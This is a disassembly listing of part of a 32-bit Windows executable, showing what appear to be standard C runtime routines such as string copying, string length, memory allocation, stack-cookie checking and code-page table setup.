  403463:	je     0x40346b
  403465:	rep stos DWORD PTR es:[edi],eax
  403467:	test   edx,edx
  403469:	je     0x403475
  40346b:	mov    BYTE PTR [edi],al
  40346d:	add    edi,0x1
  403470:	sub    edx,0x1
  403473:	jne    0x40346b
  403475:	mov    eax,DWORD PTR [esp+0x8]
  403479:	pop    edi
  40347a:	ret    
  40347b:	mov    eax,DWORD PTR [esp+0x4]
  40347f:	ret    
  403480:	cmp    DWORD PTR ds:0x429c04,0x3
  403487:	push   esi
  403488:	mov    esi,DWORD PTR [esp+0x8]
  40348c:	jne    0x4034a1
  40348e:	cmp    esi,DWORD PTR ds:0x4299b0
  403494:	ja     0x4034a1
  403496:	push   esi
  403497:	call   0x404728
  40349c:	test   eax,eax
  40349e:	pop    ecx
  40349f:	jne    0x4034c4
  4034a1:	test   esi,esi
  4034a3:	jne    0x4034a6
  4034a5:	inc    esi
  4034a6:	cmp    DWORD PTR ds:0x429c04,0x1
  4034ad:	je     0x4034b5
  4034af:	add    esi,0xf
  4034b2:	and    esi,0xfffffff0
  4034b5:	push   esi
  4034b6:	push   0x0
  4034b8:	push   DWORD PTR ds:0x429c00
  4034be:	call   DWORD PTR ds:0x4260a0
  4034c4:	pop    esi
  4034c5:	ret    
  4034c6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4034cb:	ja     0x4034ef
  4034cd:	push   DWORD PTR [esp+0x4]
  4034d1:	call   0x403480
  4034d6:	test   eax,eax
  4034d8:	pop    ecx
  4034d9:	jne    0x4034f1
  4034db:	cmp    DWORD PTR [esp+0x8],eax
  4034df:	je     0x4034f1
  4034e1:	push   DWORD PTR [esp+0x4]
  4034e5:	call   0x404ee2
  4034ea:	test   eax,eax
  4034ec:	pop    ecx
  4034ed:	jne    0x4034cd
  4034ef:	xor    eax,eax
  4034f1:	ret    
  4034f2:	push   DWORD PTR ds:0x428974
  4034f8:	push   DWORD PTR [esp+0x8]
  4034fc:	call   0x4034c6
  403501:	pop    ecx
  403502:	pop    ecx
  403503:	ret    
  403504:	push   ebp
  403505:	mov    ebp,esp
  403507:	sub    esp,0x48
  40350a:	push   ebx
  40350b:	push   esi
  40350c:	push   edi
  40350d:	push   0x4
  40350f:	pop    eax
  403510:	call   0x4030f0
  403515:	mov    ebx,esp
  403517:	push   0x1c
  403519:	lea    eax,[ebp-0x24]
  40351c:	push   eax
  40351d:	push   ebx
  40351e:	call   DWORD PTR ds:0x4260ac
  403524:	test   eax,eax
  403526:	je     0x403599
  403528:	mov    edi,DWORD PTR [ebp-0x20]
  40352b:	lea    eax,[ebp-0x48]
  40352e:	push   eax
  40352f:	call   DWORD PTR ds:0x4260a8
  403535:	mov    eax,DWORD PTR [ebp-0x44]
  403538:	lea    esi,[eax-0x1]
  40353b:	not    esi
  40353d:	and    esi,ebx
  40353f:	sub    esi,eax
  403541:	mov    DWORD PTR [ebp-0x4],eax
  403544:	mov    eax,ds:0x4287d8
  403549:	mov    ecx,eax
  40354b:	dec    ecx
  40354c:	neg    ecx
  40354e:	sbb    ecx,ecx
  403550:	and    ecx,0xffff1000
  403556:	add    ecx,0x11000
  40355c:	add    ecx,edi
  40355e:	cmp    esi,ecx
  403560:	jb     0x403599
  403562:	cmp    eax,0x1
  403565:	je     0x4035b1
  403567:	mov    ebx,edi
  403569:	mov    edi,0x1000
  40356e:	push   0x1c
  403570:	lea    eax,[ebp-0x24]
  403573:	push   eax
  403574:	push   ebx
  403575:	call   DWORD PTR ds:0x4260ac
  40357b:	test   eax,eax
  40357d:	je     0x403599
  40357f:	add    ebx,DWORD PTR [ebp-0x18]
  403582:	test   DWORD PTR [ebp-0x14],edi
  403585:	je     0x40356e
  403587:	test   BYTE PTR [ebp-0xf],0x1
  40358b:	mov    ebx,DWORD PTR [ebp-0x24]
  40358e:	je     0x403595
  403590:	xor    eax,eax
  403592:	inc    eax
  403593:	jmp    0x4035cd
  403595:	cmp    esi,ebx
  403597:	jae    0x40359d
  403599:	xor    eax,eax
  40359b:	jmp    0x4035cd
  40359d:	push   0x4
  40359f:	push   edi
  4035a0:	push   DWORD PTR [ebp-0x4]
  4035a3:	push   ebx
  4035a4:	call   DWORD PTR ds:0x426020
  4035aa:	mov    eax,ds:0x4287d8
  4035af:	jmp    0x4035b3
  4035b1:	mov    ebx,esi
  4035b3:	dec    eax
  4035b4:	neg    eax
  4035b6:	sbb    eax,eax
  4035b8:	and    eax,0x103
  4035bd:	lea    ecx,[ebp-0x8]
  4035c0:	push   ecx
  4035c1:	inc    eax
  4035c2:	push   eax
  4035c3:	push   DWORD PTR [ebp-0x4]
  4035c6:	push   ebx
  4035c7:	call   DWORD PTR ds:0x4260a4
  4035cd:	lea    esp,[ebp-0x54]
  4035d0:	pop    edi
  4035d1:	pop    esi
  4035d2:	pop    ebx
  4035d3:	leave  
  4035d4:	ret    
  4035d5:	push   0x8
  4035d7:	push   0x426900
  4035dc:	call   0x4030a4
  4035e1:	and    DWORD PTR [ebp-0x4],0x0
  4035e5:	push   0x0
  4035e7:	push   0x1
  4035e9:	call   0x404f5c
  4035ee:	pop    ecx
  4035ef:	pop    ecx
  4035f0:	jmp    0x4035f9
  4035f2:	xor    eax,eax
  4035f4:	inc    eax
  4035f5:	ret    
  4035f6:	mov    esp,DWORD PTR [ebp-0x18]
  4035f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4035fd:	push   0x3
  4035ff:	call   DWORD PTR ds:0x426058
  403605:	int3   
  403606:	cmp    ecx,DWORD PTR ds:0x4282a8
  40360c:	jne    0x40360f
  40360e:	ret    
  40360f:	jmp    0x4035d5
  403614:	int3   
  403615:	int3   
  403616:	int3   
  403617:	int3   
  403618:	int3   
  403619:	int3   
  40361a:	int3   
  40361b:	int3   
  40361c:	int3   
  40361d:	int3   
  40361e:	int3   
  40361f:	int3   
  403620:	mov    eax,DWORD PTR [esp+0x8]
  403624:	mov    ecx,DWORD PTR [esp+0x10]
  403628:	or     ecx,eax
  40362a:	mov    ecx,DWORD PTR [esp+0xc]
  40362e:	jne    0x403639
  403630:	mov    eax,DWORD PTR [esp+0x4]
  403634:	mul    ecx
  403636:	ret    0x10
  403639:	push   ebx
  40363a:	mul    ecx
  40363c:	mov    ebx,eax
  40363e:	mov    eax,DWORD PTR [esp+0x8]
  403642:	mul    DWORD PTR [esp+0x14]
  403646:	add    ebx,eax
  403648:	mov    eax,DWORD PTR [esp+0x8]
  40364c:	mul    ecx
  40364e:	add    edx,ebx
  403650:	pop    ebx
  403651:	ret    0x10
  403654:	push   esi
  403655:	push   DWORD PTR ds:0x429d28
  40365b:	call   0x405208
  403660:	pop    ecx
  403661:	mov    ecx,DWORD PTR ds:0x429d24
  403667:	mov    esi,eax
  403669:	mov    eax,ds:0x429d28
  40366e:	mov    edx,ecx
  403670:	sub    edx,eax
  403672:	add    edx,0x4
  403675:	cmp    esi,edx
  403677:	jae    0x4036c7
  403679:	mov    ecx,0x800
  40367e:	cmp    esi,ecx
  403680:	jae    0x403684
  403682:	mov    ecx,esi
  403684:	add    ecx,esi
  403686:	push   ecx
  403687:	push   eax
  403688:	call   0x4050a6
  40368d:	test   eax,eax
  40368f:	pop    ecx
  403690:	pop    ecx
  403691:	jne    0x4036aa
  403693:	add    esi,0x10
  403696:	push   esi
  403697:	push   DWORD PTR ds:0x429d28
  40369d:	call   0x4050a6
  4036a2:	test   eax,eax
  4036a4:	pop    ecx
  4036a5:	pop    ecx
  4036a6:	jne    0x4036aa
  4036a8:	pop    esi
  4036a9:	ret    
  4036aa:	mov    ecx,DWORD PTR ds:0x429d24
  4036b0:	sub    ecx,DWORD PTR ds:0x429d28
  4036b6:	mov    ds:0x429d28,eax
  4036bb:	sar    ecx,0x2
  4036be:	lea    ecx,[eax+ecx*4]
  4036c1:	mov    DWORD PTR ds:0x429d24,ecx
  4036c7:	mov    eax,DWORD PTR [esp+0x8]
  4036cb:	mov    DWORD PTR [ecx],eax
  4036cd:	add    DWORD PTR ds:0x429d24,0x4
  4036d4:	pop    esi
  4036d5:	ret    
  4036d6:	push   DWORD PTR [esp+0x4]
  4036da:	call   0x403654
  4036df:	neg    eax
  4036e1:	sbb    eax,eax
  4036e3:	neg    eax
  4036e5:	pop    ecx
  4036e6:	dec    eax
  4036e7:	ret    
  4036e8:	push   0x80
  4036ed:	call   0x4034f2
  4036f2:	test   eax,eax
  4036f4:	pop    ecx
  4036f5:	mov    ds:0x429d28,eax
  4036fa:	jne    0x403700
  4036fc:	push   0x18
  4036fe:	pop    eax
  4036ff:	ret    
  403700:	and    DWORD PTR [eax],0x0
  403703:	mov    eax,ds:0x429d28
  403708:	mov    ds:0x429d24,eax
  40370d:	xor    eax,eax
  40370f:	ret    
  403710:	push   ebp
  403711:	mov    ebp,esp
  403713:	sub    esp,0x10
  403716:	push   ebx
  403717:	xor    ebx,ebx
  403719:	cmp    DWORD PTR ds:0x428934,ebx
  40371f:	push   esi
  403720:	push   edi
  403721:	jne    0x403790
  403723:	push   0x426970
  403728:	call   DWORD PTR ds:0x4260b0
  40372e:	mov    edi,eax
  403730:	cmp    edi,ebx
  403732:	je     0x4037cb
  403738:	mov    esi,DWORD PTR ds:0x426014
  40373e:	push   0x426964
  403743:	push   edi
  403744:	call   esi
  403746:	test   eax,eax
  403748:	mov    ds:0x428934,eax
  40374d:	je     0x4037cb
  40374f:	push   0x426954
  403754:	push   edi
  403755:	call   esi
  403757:	push   0x426940
  40375c:	push   edi
  40375d:	mov    ds:0x428938,eax
  403762:	call   esi
  403764:	cmp    DWORD PTR ds:0x4287d8,0x2
  40376b:	mov    ds:0x42893c,eax
  403770:	jne    0x403790
  403772:	push   0x426924
  403777:	push   edi
  403778:	call   esi
  40377a:	test   eax,eax
  40377c:	mov    ds:0x428944,eax
  403781:	je     0x403790
  403783:	push   0x42690c
  403788:	push   edi
  403789:	call   esi
  40378b:	mov    ds:0x428940,eax
  403790:	mov    eax,ds:0x428940
  403795:	test   eax,eax
  403797:	je     0x4037d5
  403799:	call   eax
  40379b:	test   eax,eax
  40379d:	je     0x4037bc
  40379f:	lea    ecx,[ebp-0x4]
  4037a2:	push   ecx
  4037a3:	push   0xc
  4037a5:	lea    ecx,[ebp-0x10]
  4037a8:	push   ecx
  4037a9:	push   0x1
  4037ab:	push   eax
  4037ac:	call   DWORD PTR ds:0x428944
  4037b2:	test   eax,eax
  4037b4:	je     0x4037bc
  4037b6:	test   BYTE PTR [ebp-0x8],0x1
  4037ba:	jne    0x4037d5
  4037bc:	cmp    DWORD PTR ds:0x4287e4,0x4
  4037c3:	jb     0x4037cf
  4037c5:	or     BYTE PTR [ebp+0x12],0x20
  4037c9:	jmp    0x4037f4
  4037cb:	xor    eax,eax
  4037cd:	jmp    0x403804
  4037cf:	or     BYTE PTR [ebp+0x12],0x4
  4037d3:	jmp    0x4037f4
  4037d5:	mov    eax,ds:0x428938
  4037da:	test   eax,eax
  4037dc:	je     0x4037f4
  4037de:	call   eax
  4037e0:	mov    ebx,eax
  4037e2:	test   ebx,ebx
  4037e4:	je     0x4037f4
  4037e6:	mov    eax,ds:0x42893c
  4037eb:	test   eax,eax
  4037ed:	je     0x4037f4
  4037ef:	push   ebx
  4037f0:	call   eax
  4037f2:	mov    ebx,eax
  4037f4:	push   DWORD PTR [ebp+0x10]
  4037f7:	push   DWORD PTR [ebp+0xc]
  4037fa:	push   DWORD PTR [ebp+0x8]
  4037fd:	push   ebx
  4037fe:	call   DWORD PTR ds:0x428934
  403804:	pop    edi
  403805:	pop    esi
  403806:	pop    ebx
  403807:	leave  
  403808:	ret    
  403809:	int3   
  40380a:	int3   
  40380b:	int3   
  40380c:	int3   
  40380d:	int3   
  40380e:	int3   
  40380f:	int3   
  403810:	push   edi
  403811:	mov    edi,DWORD PTR [esp+0x8]
  403815:	jmp    0x403885
  403817:	lea    esp,[esp+0x0]
  40381e:	mov    edi,edi
  403820:	mov    ecx,DWORD PTR [esp+0x4]
  403824:	push   edi
  403825:	test   ecx,0x3
  40382b:	je     0x403840
  40382d:	mov    al,BYTE PTR [ecx]
  40382f:	add    ecx,0x1
  403832:	test   al,al
  403834:	je     0x403873
  403836:	test   ecx,0x3
  40383c:	jne    0x40382d
  40383e:	mov    edi,edi
  403840:	mov    eax,DWORD PTR [ecx]
  403842:	mov    edx,0x7efefeff
  403847:	add    edx,eax
  403849:	xor    eax,0xffffffff
  40384c:	xor    eax,edx
  40384e:	add    ecx,0x4
  403851:	test   eax,0x81010100
  403856:	je     0x403840
  403858:	mov    eax,DWORD PTR [ecx-0x4]
  40385b:	test   al,al
  40385d:	je     0x403882
  40385f:	test   ah,ah
  403861:	je     0x40387d
  403863:	test   eax,0xff0000
  403868:	je     0x403878
  40386a:	test   eax,0xff000000
  40386f:	je     0x403873
  403871:	jmp    0x403840
  403873:	lea    edi,[ecx-0x1]
  403876:	jmp    0x403885
  403878:	lea    edi,[ecx-0x2]
  40387b:	jmp    0x403885
  40387d:	lea    edi,[ecx-0x3]
  403880:	jmp    0x403885
  403882:	lea    edi,[ecx-0x4]
  403885:	mov    ecx,DWORD PTR [esp+0xc]
  403889:	test   ecx,0x3
  40388f:	je     0x4038ae
  403891:	mov    dl,BYTE PTR [ecx]
  403893:	add    ecx,0x1
  403896:	test   dl,dl
  403898:	je     0x403900
  40389a:	mov    BYTE PTR [edi],dl
  40389c:	add    edi,0x1
  40389f:	test   ecx,0x3
  4038a5:	jne    0x403891
  4038a7:	jmp    0x4038ae
  4038a9:	mov    DWORD PTR [edi],edx
  4038ab:	add    edi,0x4
  4038ae:	mov    edx,0x7efefeff
  4038b3:	mov    eax,DWORD PTR [ecx]
  4038b5:	add    edx,eax
  4038b7:	xor    eax,0xffffffff
  4038ba:	xor    eax,edx
  4038bc:	mov    edx,DWORD PTR [ecx]
  4038be:	add    ecx,0x4
  4038c1:	test   eax,0x81010100
  4038c6:	je     0x4038a9
  4038c8:	test   dl,dl
  4038ca:	je     0x403900
  4038cc:	test   dh,dh
  4038ce:	je     0x4038f7
  4038d0:	test   edx,0xff0000
  4038d6:	je     0x4038ea
  4038d8:	test   edx,0xff000000
  4038de:	je     0x4038e2
  4038e0:	jmp    0x4038a9
  4038e2:	mov    DWORD PTR [edi],edx
  4038e4:	mov    eax,DWORD PTR [esp+0x8]
  4038e8:	pop    edi
  4038e9:	ret    
  4038ea:	mov    WORD PTR [edi],dx
  4038ed:	mov    eax,DWORD PTR [esp+0x8]
  4038f1:	mov    BYTE PTR [edi+0x2],0x0
  4038f5:	pop    edi
  4038f6:	ret    
  4038f7:	mov    WORD PTR [edi],dx
  4038fa:	mov    eax,DWORD PTR [esp+0x8]
  4038fe:	pop    edi
  4038ff:	ret    
  403900:	mov    BYTE PTR [edi],dl
  403902:	mov    eax,DWORD PTR [esp+0x8]
  403906:	pop    edi
  403907:	ret    
  403908:	int3   
  403909:	int3   
  40390a:	int3   
  40390b:	int3   
  40390c:	int3   
  40390d:	int3   
  40390e:	int3   
  40390f:	int3   
  403910:	mov    ecx,DWORD PTR [esp+0xc]
  403914:	push   edi
  403915:	test   ecx,ecx
  403917:	je     0x4039af
  40391d:	push   esi
  40391e:	push   ebx
  40391f:	mov    ebx,ecx
  403921:	mov    esi,DWORD PTR [esp+0x14]
  403925:	test   esi,0x3
  40392b:	mov    edi,DWORD PTR [esp+0x10]
  40392f:	jne    0x40393c
  403931:	shr    ecx,0x2
  403934:	jne    0x4039bf
  40393a:	jmp    0x403963
  40393c:	mov    al,BYTE PTR [esi]
  40393e:	add    esi,0x1
  403941:	mov    BYTE PTR [edi],al
  403943:	add    edi,0x1
  403946:	sub    ecx,0x1
  403949:	je     0x403976
  40394b:	test   al,al
  40394d:	je     0x40397e
  40394f:	test   esi,0x3
  403955:	jne    0x40393c
  403957:	mov    ebx,ecx
  403959:	shr    ecx,0x2
  40395c:	jne    0x4039bf
  40395e:	and    ebx,0x3
  403961:	je     0x403976
  403963:	mov    al,BYTE PTR [esi]
  403965:	add    esi,0x1
  403968:	mov    BYTE PTR [edi],al
  40396a:	add    edi,0x1
  40396d:	test   al,al
  40396f:	je     0x4039a8
  403971:	sub    ebx,0x1
  403974:	jne    0x403963
  403976:	mov    eax,DWORD PTR [esp+0x10]
  40397a:	pop    ebx
  40397b:	pop    esi
  40397c:	pop    edi
  40397d:	ret    
  40397e:	test   edi,0x3
  403984:	je     0x40399c
  403986:	mov    BYTE PTR [edi],al
  403988:	add    edi,0x1
  40398b:	sub    ecx,0x1
  40398e:	je     0x403a2c
  403994:	test   edi,0x3
  40399a:	jne    0x403986
  40399c:	mov    ebx,ecx
  40399e:	shr    ecx,0x2
  4039a1:	jne    0x403a17
  4039a3:	mov    BYTE PTR [edi],al
  4039a5:	add    edi,0x1
  4039a8:	sub    ebx,0x1
  4039ab:	jne    0x4039a3
  4039ad:	pop    ebx
  4039ae:	pop    esi
  4039af:	mov    eax,DWORD PTR [esp+0x8]
  4039b3:	pop    edi
  4039b4:	ret    
  4039b5:	mov    DWORD PTR [edi],edx
  4039b7:	add    edi,0x4
  4039ba:	sub    ecx,0x1
  4039bd:	je     0x40395e
  4039bf:	mov    edx,0x7efefeff
  4039c4:	mov    eax,DWORD PTR [esi]
  4039c6:	add    edx,eax
  4039c8:	xor    eax,0xffffffff
  4039cb:	xor    eax,edx
  4039cd:	mov    edx,DWORD PTR [esi]
  4039cf:	add    esi,0x4
  4039d2:	test   eax,0x81010100
  4039d7:	je     0x4039b5
  4039d9:	test   dl,dl
  4039db:	je     0x403a09
  4039dd:	test   dh,dh
  4039df:	je     0x4039ff
  4039e1:	test   edx,0xff0000
  4039e7:	je     0x4039f5
  4039e9:	test   edx,0xff000000
  4039ef:	jne    0x4039b5
  4039f1:	mov    DWORD PTR [edi],edx
  4039f3:	jmp    0x403a0d
  4039f5:	and    edx,0xffff
  4039fb:	mov    DWORD PTR [edi],edx
  4039fd:	jmp    0x403a0d
  4039ff:	and    edx,0xff
  403a05:	mov    DWORD PTR [edi],edx
  403a07:	jmp    0x403a0d
  403a09:	xor    edx,edx
  403a0b:	mov    DWORD PTR [edi],edx
  403a0d:	add    edi,0x4
  403a10:	xor    eax,eax
  403a12:	sub    ecx,0x1
  403a15:	je     0x403a23
  403a17:	xor    eax,eax
  403a19:	mov    DWORD PTR [edi],eax
  403a1b:	add    edi,0x4
  403a1e:	sub    ecx,0x1
  403a21:	jne    0x403a19
  403a23:	and    ebx,0x3
  403a26:	jne    0x4039a3
  403a2c:	mov    eax,DWORD PTR [esp+0x10]
  403a30:	pop    ebx
  403a31:	pop    esi
  403a32:	pop    edi
  403a33:	ret    
  403a34:	int3   
  403a35:	int3   
  403a36:	int3   
  403a37:	int3   
  403a38:	int3   
  403a39:	int3   
  403a3a:	int3   
  403a3b:	int3   
  403a3c:	int3   
  403a3d:	int3   
  403a3e:	int3   
  403a3f:	int3   
  403a40:	mov    ecx,DWORD PTR [esp+0x4]
  403a44:	test   ecx,0x3
  403a4a:	je     0x403a70
  403a4c:	mov    al,BYTE PTR [ecx]
  403a4e:	add    ecx,0x1
  403a51:	test   al,al
  403a53:	je     0x403aa3
  403a55:	test   ecx,0x3
  403a5b:	jne    0x403a4c
  403a5d:	add    eax,0x0
  403a62:	lea    esp,[esp+0x0]
  403a69:	lea    esp,[esp+0x0]
  403a70:	mov    eax,DWORD PTR [ecx]
  403a72:	mov    edx,0x7efefeff
  403a77:	add    edx,eax
  403a79:	xor    eax,0xffffffff
  403a7c:	xor    eax,edx
  403a7e:	add    ecx,0x4
  403a81:	test   eax,0x81010100
  403a86:	je     0x403a70
  403a88:	mov    eax,DWORD PTR [ecx-0x4]
  403a8b:	test   al,al
  403a8d:	je     0x403ac1
  403a8f:	test   ah,ah
  403a91:	je     0x403ab7
  403a93:	test   eax,0xff0000
  403a98:	je     0x403aad
  403a9a:	test   eax,0xff000000
  403a9f:	je     0x403aa3
  403aa1:	jmp    0x403a70
  403aa3:	lea    eax,[ecx-0x1]
  403aa6:	mov    ecx,DWORD PTR [esp+0x4]
  403aaa:	sub    eax,ecx
  403aac:	ret    
  403aad:	lea    eax,[ecx-0x2]
  403ab0:	mov    ecx,DWORD PTR [esp+0x4]
  403ab4:	sub    eax,ecx
  403ab6:	ret    
  403ab7:	lea    eax,[ecx-0x3]
  403aba:	mov    ecx,DWORD PTR [esp+0x4]
  403abe:	sub    eax,ecx
  403ac0:	ret    
  403ac1:	lea    eax,[ecx-0x4]
  403ac4:	mov    ecx,DWORD PTR [esp+0x4]
  403ac8:	sub    eax,ecx
  403aca:	ret    
  403acb:	movzx  eax,BYTE PTR [esp+0x4]
  403ad0:	mov    cl,BYTE PTR [esp+0xc]
  403ad4:	test   BYTE PTR [eax+0x4299e1],cl
  403ada:	jne    0x403af8
  403adc:	cmp    DWORD PTR [esp+0x8],0x0
  403ae1:	je     0x403af1
  403ae3:	movzx  eax,WORD PTR [eax*2+0x4264f2]
  403aeb:	and    eax,DWORD PTR [esp+0x8]
  403aef:	jmp    0x403af3
  403af1:	xor    eax,eax
  403af3:	test   eax,eax
  403af5:	jne    0x403af8
  403af7:	ret    
  403af8:	xor    eax,eax
  403afa:	inc    eax
  403afb:	ret    
  403afc:	push   0x4
  403afe:	push   0x0
  403b00:	push   DWORD PTR [esp+0xc]
  403b04:	call   0x403acb
  403b09:	add    esp,0xc
  403b0c:	ret    
  403b0d:	sub    eax,0x3a4
  403b12:	je     0x403b36
  403b14:	sub    eax,0x4
  403b17:	je     0x403b30
  403b19:	sub    eax,0xd
  403b1c:	je     0x403b2a
  403b1e:	dec    eax
  403b1f:	je     0x403b24
  403b21:	xor    eax,eax
  403b23:	ret    
  403b24:	mov    eax,0x404
  403b29:	ret    
  403b2a:	mov    eax,0x412
  403b2f:	ret    
  403b30:	mov    eax,0x804
  403b35:	ret    
  403b36:	mov    eax,0x411
  403b3b:	ret    
  403b3c:	push   edi
  403b3d:	push   0x40
  403b3f:	xor    eax,eax
  403b41:	pop    ecx
  403b42:	mov    edi,0x4299e0
  403b47:	rep stos DWORD PTR es:[edi],eax
  403b49:	stos   BYTE PTR es:[edi],al
  403b4a:	xor    eax,eax
  403b4c:	mov    ds:0x429ae4,eax
  403b51:	mov    ds:0x4299c4,eax
  403b56:	mov    ds:0x4299c0,eax
  403b5b:	mov    edi,0x429af0
  403b60:	stos   DWORD PTR es:[edi],eax
  403b61:	stos   DWORD PTR es:[edi],eax
  403b62:	stos   DWORD PTR es:[edi],eax
  403b63:	pop    edi
  403b64:	ret    
  403b65:	push   ebp
  403b66:	mov    ebp,esp
  403b68:	sub    esp,0x518
  403b6e:	mov    eax,ds:0x4282a8
  403b73:	xor    eax,DWORD PTR [ebp+0x4]
  403b76:	push   esi
  403b77:	mov    DWORD PTR [ebp-0x4],eax
  403b7a:	lea    eax,[ebp-0x18]
  403b7d:	push   eax
  403b7e:	push   DWORD PTR ds:0x429ae4
  403b84:	call   DWORD PTR ds:0x4260bc
  403b8a:	cmp    eax,0x1
  403b8d:	mov    esi,0x100
  403b92:	jne    0x403ca5
  403b98:	xor    eax,eax
  403b9a:	mov    BYTE PTR [ebp+eax*1-0x118],al
  403ba1:	inc    eax
  403ba2:	cmp    eax,esi
  403ba4:	jb     0x403b9a
  403ba6:	mov    al,BYTE PTR [ebp-0x12]
  403ba9:	test   al,al
  403bab:	mov    BYTE PTR [ebp-0x118],0x20
  403bb2:	je     0x403bea
  403bb4:	push   ebx
  403bb5:	lea    edx,[ebp-0x11]
  403bb8:	push   edi
  403bb9:	movzx  ecx,BYTE PTR [edx]
  403bbc:	movzx  eax,al
  403bbf:	cmp    eax,ecx
  403bc1:	ja     0x403be0
  403bc3:	sub    ecx,eax
  403bc5:	inc    ecx
  403bc6:	mov    ebx,ecx
  403bc8:	shr    ecx,0x2
  403bcb:	lea    edi,[ebp+eax*1-0x118]
  403bd2:	mov    eax,0x20202020
  403bd7:	rep stos DWORD PTR es:[edi],eax
  403bd9:	mov    ecx,ebx
  403bdb:	and    ecx,0x3
  403bde:	rep stos BYTE PTR es:[edi],al
  403be0:	inc    edx
  403be1:	mov    al,BYTE PTR [edx]
  403be3:	inc    edx
  403be4:	test   al,al
  403be6:	jne    0x403bb9
  403be8:	pop    edi
  403be9:	pop    ebx
  403bea:	push   0x0
  403bec:	push   DWORD PTR ds:0x4299c0
  403bf2:	lea    eax,[ebp-0x518]
  403bf8:	push   DWORD PTR ds:0x429ae4
  403bfe:	push   eax
  403bff:	push   esi
  403c00:	lea    eax,[ebp-0x118]
  403c06:	push   eax
  403c07:	push   0x1
  403c09:	call   0x404b04
  403c0e:	push   0x0
  403c10:	push   DWORD PTR ds:0x429ae4
  403c16:	lea    eax,[ebp-0x218]
  403c1c:	push   esi
  403c1d:	push   eax
  403c1e:	push   esi
  403c1f:	lea    eax,[ebp-0x118]
  403c25:	push   eax
  403c26:	push   esi
  403c27:	push   DWORD PTR ds:0x4299c0
  403c2d:	call   0x405240
  403c32:	push   0x0
  403c34:	push   DWORD PTR ds:0x429ae4
  403c3a:	lea    eax,[ebp-0x318]
  403c40:	push   esi
  403c41:	push   eax
  403c42:	push   esi
  403c43:	lea    eax,[ebp-0x118]
  403c49:	push   eax
  403c4a:	push   0x200
  403c4f:	push   DWORD PTR ds:0x4299c0
  403c55:	call   0x405240
  403c5a:	add    esp,0x5c
  403c5d:	xor    eax,eax
  403c5f:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  403c67:	test   cl,0x1
  403c6a:	je     0x403c82
  403c6c:	or     BYTE PTR [eax+0x4299e1],0x10
  403c73:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  403c7a:	mov    BYTE PTR [eax+0x429b00],cl
  403c80:	jmp    0x403c9e
  403c82:	test   cl,0x2
  403c85:	je     0x403c97
  403c87:	or     BYTE PTR [eax+0x4299e1],0x20
  403c8e:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  403c95:	jmp    0x403c7a
  403c97:	and    BYTE PTR [eax+0x429b00],0x0
  403c9e:	inc    eax
  403c9f:	cmp    eax,esi
  403ca1:	jb     0x403c5f
  403ca3:	jmp    0x403ce9
  403ca5:	xor    eax,eax
  403ca7:	cmp    eax,0x41
  403caa:	jb     0x403cc5
  403cac:	cmp    eax,0x5a
  403caf:	ja     0x403cc5
  403cb1:	or     BYTE PTR [eax+0x4299e1],0x10
  403cb8:	mov    cl,al
  403cba:	add    cl,0x20
  403cbd:	mov    BYTE PTR [eax+0x429b00],cl
  403cc3:	jmp    0x403ce4
  403cc5:	cmp    eax,0x61
  403cc8:	jb     0x403cdd
  403cca:	cmp    eax,0x7a
  403ccd:	ja     0x403cdd
  403ccf:	or     BYTE PTR [eax+0x4299e1],0x20
  403cd6:	mov    cl,al
  403cd8:	sub    cl,0x20
  403cdb:	jmp    0x403cbd
  403cdd:	and    BYTE PTR [eax+0x429b00],0x0
  403ce4:	inc    eax
  403ce5:	cmp    eax,esi
  403ce7:	jb     0x403ca7
  403ce9:	mov    ecx,DWORD PTR [ebp-0x4]
  403cec:	xor    ecx,DWORD PTR [ebp+0x4]
  403cef:	pop    esi
  403cf0:	call   0x403606
  403cf5:	leave  
  403cf6:	ret    
  403cf7:	push   ebp
  403cf8:	mov    ebp,esp
  403cfa:	sub    esp,0x1c
  403cfd:	mov    eax,ds:0x4282a8
  403d02:	xor    eax,DWORD PTR [ebp+0x4]
  403d05:	push   ebx
  403d06:	push   esi
  403d07:	mov    esi,DWORD PTR [ebp+0x8]
  403d0a:	xor    ebx,ebx
  403d0c:	cmp    esi,0xfffffffe
  403d0f:	mov    DWORD PTR [ebp-0x4],eax
  403d12:	push   edi
  403d13:	mov    DWORD PTR ds:0x428948,ebx
  403d19:	jne    0x403d2d
  403d1b:	mov    DWORD PTR ds:0x428948,0x1
  403d25:	call   DWORD PTR ds:0x4260b8
  403d2b:	jmp    0x403d58
  403d2d:	cmp    esi,0xfffffffd
  403d30:	jne    0x403d44
  403d32:	mov    DWORD PTR ds:0x428948,0x1
  403d3c:	call   DWORD PTR ds:0x4260b4
  403d42:	jmp    0x403d58
  403d44:	cmp    esi,0xfffffffc
  403d47:	jne    0x403d5d
  403d49:	mov    eax,ds:0x428968
  403d4e:	mov    DWORD PTR ds:0x428948,0x1
  403d58:	mov    DWORD PTR [ebp+0x8],eax
  403d5b:	mov    esi,eax
  403d5d:	cmp    esi,DWORD PTR ds:0x429ae4
  403d63:	je     0x403ecc
  403d69:	cmp    esi,ebx
  403d6b:	je     0x403ec2
  403d71:	xor    edx,edx
  403d73:	xor    eax,eax
  403d75:	cmp    DWORD PTR [eax+0x4282b8],esi
  403d7b:	je     0x403de4
  403d7d:	add    eax,0x30
  403d80:	inc    edx
  403d81:	cmp    eax,0xf0
  403d86:	jb     0x403d75
  403d88:	lea    eax,[ebp-0x1c]
  403d8b:	push   eax
  403d8c:	push   esi
  403d8d:	call   DWORD PTR ds:0x4260bc
  403d93:	cmp    eax,0x1
  403d96:	jne    0x403eba
  403d9c:	push   0x40
  403d9e:	xor    eax,eax
  403da0:	pop    ecx
  403da1:	mov    edi,0x4299e0
  403da6:	rep stos DWORD PTR es:[edi],eax
  403da8:	stos   BYTE PTR es:[edi],al
  403da9:	xor    edi,edi
  403dab:	inc    edi
  403dac:	cmp    DWORD PTR [ebp-0x1c],edi
  403daf:	mov    DWORD PTR ds:0x429ae4,esi
  403db5:	mov    DWORD PTR ds:0x4299c0,ebx
  403dbb:	jbe    0x403ea8
  403dc1:	cmp    BYTE PTR [ebp-0x16],0x0
  403dc5:	je     0x403e83
  403dcb:	lea    ecx,[ebp-0x15]
  403dce:	mov    dl,BYTE PTR [ecx]
  403dd0:	test   dl,dl
  403dd2:	je     0x403e83
  403dd8:	movzx  eax,BYTE PTR [ecx-0x1]
  403ddc:	movzx  edx,dl
